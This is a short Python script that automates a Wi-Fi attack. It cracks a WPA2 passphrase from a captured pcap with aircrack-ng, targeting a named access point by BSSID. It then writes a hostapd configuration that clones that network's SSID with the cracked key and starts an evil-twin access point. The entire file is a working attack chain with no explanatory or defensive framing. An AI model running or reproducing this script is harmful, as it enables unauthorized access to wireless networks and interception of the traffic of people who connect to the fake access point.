import subprocess
from pathlib import Path

def break_key(pcap_file: Path) -> None:
    """Break the key using aircrack-ng."""
    subprocess.run([
        "aircrack-ng",
        "-a",
        "2",
        "-b",
        "9C:A2:F4:28:E8:AB",
        "-l",
        "./cracked_key.txt",
        str(pcap_file),
        "-w",
        "mockyou.txt"
    ])

def configure_evil_twin() -> None:
    """Create the evil twin with a password"""
    key_text = None
    with Path.open("./cracked_key.txt", "r") as key:
        key_text = key.read()
        print(f"Key found from file: {key_text}")
    config = f"""interface=wlp2s0
driver=nl80211
ssid=TP-Link_E8AC
hw_mode=g
channel=6

auth_algs=1
wpa=2
wpa_passphrase={key_text}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP"""
    with Path.open("/etc/hostapd/hostapd.conf", "w") as conf_file:
        conf_file.write(config)

def run_evil_twin() -> None:
    """Starts the evil twin assuming it's properly configured."""
    subprocess.run(["sudo", "systemctl", "start", "hostapd"])


if __name__ == "__main__":
    # Take PCAP file and break the passkey.
    pcap = input("Insert pcap file path: ")
    break_key(pcap_file=Path(pcap).resolve())
    
    # Make new evil twin with the passkey that we cracked.
    configure_evil_twin()

    # Run the evil twin.
    run_evil_twin()

